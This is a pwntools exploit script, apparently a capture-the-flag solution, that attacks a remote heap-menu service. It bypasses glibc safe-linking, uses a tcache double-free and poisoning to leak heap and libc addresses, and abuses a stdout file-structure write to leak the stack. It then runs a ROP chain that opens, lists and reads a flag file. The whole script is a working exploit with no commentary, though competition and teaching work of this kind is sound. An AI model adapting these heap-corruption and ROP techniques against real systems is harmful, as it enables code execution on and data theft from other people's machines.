from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('chall')
libc = elf.libc
#p = elf.process()
p = remote('34.101.122.7',10003)
#gdb.attach(p)

def add(idx,size,price,data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendlineafter(b': ', str(price).encode())
    if size:
        p.sendafter(b': ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', str(idx).encode())
    p.recvuntil(b'Item name: ')
    return p.recvline(0).strip()

def dec(addr):
    mid = addr >> 12 ^ addr
    ril = mid >> 24 ^ mid
    return ril

def enc(x, addr):
    return x^(addr>>12)

p.sendline()

add(0, 0x78, 1, b'A'*8)
add(1, 0x78, 1, b'B'*8)

free(0)
free(1)

add(2, 0x78, 1, b'C')

heap_base = dec(unpack(show(2),'all')) >> 12 << 12
log.info(f'heap base: {hex(heap_base)}')

free(2)

for i in range(9):
    add(i, 0x78, 1, f'{str(i) * 8}'.encode())

for i in range(7):
    free(i)

free(7)
free(8)
free(7)

for i in range(3):
    add(i, 0x10, 0x100, f'{chr(65+i) * 8}'.encode())

add(3, 0x10, 0xdead, p64(enc(heap_base+0x290, heap_base+0x700)))
add(4, 0x78, 0x900d, b'ishowmeat')
add(0, 0x10, 0x1234, b'A'*8 + p64(0x481))

free(2)

add(0,0,0,0)

libc.address = (unpack(show(0),'all') &~0xfff) - 0x21a000
log.info(f'libc base: {hex(libc.address)}')

stdout = libc.sym['_IO_2_1_stdout_']
stdout_enc = enc(stdout, heap_base+0x2c0)

log.info(f'stdout: {hex(stdout)}')
log.info(f'stdout enc: {hex(stdout_enc)}')

add(1, 0x78, stdout_enc, b'X'*8)
for i in range(4):
    add(i, 0x78, 0xdeadbeef, b'y'*8)

fsop = p64(0xfbad1800)
fsop += p64(0)*3
fsop += p64(libc.sym.environ)
fsop += p64(libc.sym.environ+8)

add(3, 0x78, 0xbeefbeef, fsop)

stack = unpack(p.recvn(6),'all') - 0x148
log.info(f'stack: {hex(stack)}')

free(1)
free(2)

add(0, 0x50, 0x101, p64(0))
add(1, 0x50, 0x102, p64(0)*4 + p64(enc(stack, heap_base+0x400)))
add(2, 0x78, 0x103, b'lol')

rop = ROP(libc)
rop.read(0, stack, 0x200)
add(3, 0x78, 0x1234567, b'A' * 8 + bytes(rop))

rop = ROP(libc)
rop(rax=2, rdi=stack, rsi=0, rdx=0)
rop.raw(rop.find_gadget(['syscall','ret']))
rop(rax=0x4e, rdi=3, rsi=stack+0x500, rdx=0x100)
rop.raw(rop.find_gadget(['syscall','ret']))
rop.read(3, stack+0x500, 0x100)
rop.write(1, stack+0x500, 0x100)

fname = b'/flag-e9fa6b1fd75b2ae57fcb0e66790584.txt'
p.sendline(fname + b'\0' * (72 - len(fname))  + rop.chain())

p.interactive()
